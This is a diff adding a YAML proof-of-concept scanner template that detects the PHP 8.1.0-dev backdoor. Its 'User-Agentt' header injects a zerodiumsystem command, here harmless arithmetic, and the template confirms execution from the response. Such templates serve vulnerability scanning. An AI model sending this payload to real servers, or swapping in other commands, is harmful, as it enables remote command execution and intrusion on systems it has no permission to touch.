@@ -1,0 +1,16 @@
+name: poc-yaml-php8-dev-rce
+set:
+  rand1: randomInt(1099000, 9999999)
+  rand2: randomInt(1009900, 9999999)
+rules:
+  - method: GET
+    path: /
+    headers:
+      User-Agentt: zerodiumsystem('expr {{rand1}} + {{rand2}}');
+    expression: |
+      response.body.bcontains(bytes(string(rand1 + rand2)))
+detail:
+  author: tangshoupu
+  info: PHP 8.1.0-dev 后门远程命令执行
+  links:
+    - https://packetstormsecurity.com/files/162864/PHP-8.1.0-dev-Backdoor-Remote-Command-Execution.html
